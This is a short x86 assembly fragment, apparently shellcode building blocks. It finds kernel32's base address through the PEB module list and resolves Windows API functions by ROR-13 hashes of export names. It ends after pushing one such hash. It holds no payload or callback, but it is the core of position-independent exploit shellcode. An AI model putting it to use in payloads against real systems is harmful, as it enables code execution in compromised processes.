# ====================================================
# Find Kernel 32 Base Address 
# Return: EBX = Kernel 32 Base Address
# ====================================================

find_kernel32:
    xor ecx, ecx
    mov esi, fs:[ecx + 30h]
    mov esi, [esi + 0ch]
    mov esi, [esi + 1ch]

next_module:
    mov ebx, [esi + 08h]
    mov edi, [esi + 20h]
    mov esi, [esi]
    cmp [edi + 12 * 2], cx
    jne next_module
    ret

# ====================================================
# Find Function Address
# Input: EBX = DLL Base Address, [esp + 28h] = Target Hash
# Return: EAX = Function Address
# ====================================================

find_function:
    pushad
    mov eax, [ebx + 3ch]
    mov edi, [ebx + eax + 78h]
    add edi, ebx
    mov ecx, [edi + 18h]
    mov eax, [edi + 20h]
    add eax, ebx
    mov [ebp + 4], eax

find_function_loop:
    jecxz find_function_finished
    dec ecx
    mov eax, [ebp + 4]
    mov esi, [eax + ecx * 4]
    add esi, ebx

compute_hash:
    xor eax, eax
    cdq
    cld

compute_hash_again:
    lodsb
    test al, al
    jz compute_hash_finished
    ror edx, 0dh
    add edx, eax
    jmp compute_hash_again

compute_hash_finished:

find_function_compare:
    cmp edx, [esp + 28h]
    jnz find_function_loop
    
    mov edx, [edi + 24h]
    add edx, ebx
    mov cx, [edx + 2 * ecx]
    mov edx, [edi + 1ch]
    add edx, ebx
    mov eax, [edx + 4 * ecx]
    add eax, ebx
    mov [esp + 1ch], eax

find_function_finished:
    popad
    ret

# ====================================================
# Call Resolve Symbol
# ====================================================
resolve_symbols_kernel32:
    push ec0e4e8eh              # Push Target Hash
    push ebx                    # Push DLL base address 
    call find_function          # Call find_function
    mov [ebp + 10h], eax        # Write in under ebp
